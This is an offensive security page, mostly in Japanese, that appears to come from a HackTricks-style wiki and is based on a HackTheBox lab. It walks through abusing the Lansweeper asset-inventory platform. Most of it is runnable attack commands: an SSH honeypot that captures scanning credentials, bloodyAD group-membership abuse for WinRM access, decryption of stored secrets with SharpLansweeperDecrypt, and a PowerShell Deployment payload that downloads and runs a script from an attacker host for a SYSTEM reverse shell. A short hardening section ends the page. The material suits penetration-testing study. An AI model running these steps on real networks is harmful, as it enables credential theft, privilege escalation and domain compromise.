# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

LansweeperはWindows上に展開され、Active Directoryと統合されることが多いIT資産発見・インベントリプラットフォームです。Lansweeperに設定された資格情報は、SSH、SMB/WMI、WinRMといったプロトコルを介してアセットへ認証するためにスキャンエンジンによって使用されます。誤設定により以下が頻発します：

- スキャン対象を攻撃者管理のホスト（honeypot）にリダイレクトすることで資格情報を傍受される
- Lansweeper-related groupsによって露出したAD ACLを悪用してリモートアクセスを獲得する
- Lansweeperに設定されたシークレット（接続文字列や保存されたスキャン資格情報）をオンホストで復号する
- Deployment機能を介して管理対象エンドポイント上でコード実行を行う（多くの場合SYSTEMとして実行される）

このページは、エンゲージメント中にこれらの挙動を悪用するための実践的な攻撃者ワークフローとコマンドをまとめたものです。

## 1) Harvest scanning credentials via honeypot (SSH example)

アイデア：あなたのホストを指すScanning Targetを作成し、既存のScanning Credentialsをそれにマップします。スキャンが実行されると、Lansweeperはそれらの資格情報で認証を試み、あなたのhoneypotがそれらをキャプチャします。

手順概要（web UI）:
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
キャプチャした creds を DC services に対して検証する:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
注意
- スキャナをリスナーに誘導できる場合、他のプロトコルでも同様に機能します（SMB/WinRM honeypots, etc.）。SSH は最も単純なことが多い。
- 多くのスキャナは固有のクライアントバナー（例: RebexSSH）で自分自身を識別し、uname, whoami などの無害なコマンドを試行します。

## 2) AD ACL abuse: アプリ管理者グループに自分を追加してリモートアクセスを取得

侵害したアカウントからの有効な権利を列挙するには BloodHound を使用します。よくある発見としては、スキャナやアプリ固有のグループ（例: “Lansweeper Discovery”）が特権グループ（例: “Lansweeper Admins”）に対して GenericAll を持っているケースです。もしその特権グループが “Remote Management Users” のメンバーでもあるなら、自分を追加すると WinRM が利用可能になります。

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD (Linux) を使ってグループの GenericAll を悪用する:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
次にインタラクティブシェルを取得する:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
ヒント: Kerberos の操作は時間に敏感です。KRB_AP_ERR_SKEW に遭遇した場合は、まず DC と同期してください:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) ホスト上で Lansweeper に設定された秘密を復号する

Lansweeper サーバでは、ASP.NET サイトが通常、暗号化された接続文字列とアプリケーションで使用される対称鍵を格納しています。適切なローカルアクセスがあれば、DB 接続文字列を復号して保存されたスキャン用資格情報を抽出できます。

典型的な場所：
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- アプリケーションキー: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

保存された資格情報の復号とダンプを自動化するには SharpLansweeperDecrypt を使用します：
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
期待される出力には、DB接続の詳細や、環境全体で使用される Windows や Linux アカウントなどの平文のスキャン用資格情報が含まれます。これらはしばしばドメインホスト上でローカル権限が昇格しています:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
回収した Windows スキャン用 creds を使って特権アクセスを取得する:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.

High-level steps:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- デプロイ作業はノイズが多く、Lansweeper および Windows のイベントログに記録が残ります。慎重に実行してください。

## 検出とハードニング

- 匿名のSMB列挙を制限または無効化する。RIDサイクリングやLansweeperの共有への異常なアクセスを監視する。
- 出口制御：スキャナホストからの outbound SSH/SMB/WinRM をブロックまたは厳しく制限する。非標準ポート（例：2022）や Rebex のような異常なクライアントバナーに対してアラートを出す。
- Protect `Website\\web.config` and `Key\\Encryption.txt`。機密情報は専用の vault に外部化し、露出時にはローテーションすることを検討する。最小権限のサービスアカウントや、可能であれば gMSA の利用を検討する。
- AD の監視：Lansweeper 関連のグループ（例: “Lansweeper Admins”, “Remote Management Users”）の変更や、特権グループに対して GenericAll/Write メンバーシップを付与する ACL の変更に対してアラートを出す。
- Deployment パッケージの作成／変更／実行を監査し、cmd.exe/powershell.exe を spawn するパッケージや予期しない送信接続を行うものにアラートを出す。

## 関連トピック
- SMB/LSA/SAMR 列挙と RID サイクリング
- Kerberos の password spraying と clock skew に関する考慮事項
- BloodHound を用いた application-admin グループのパス解析
- WinRM の利用と lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
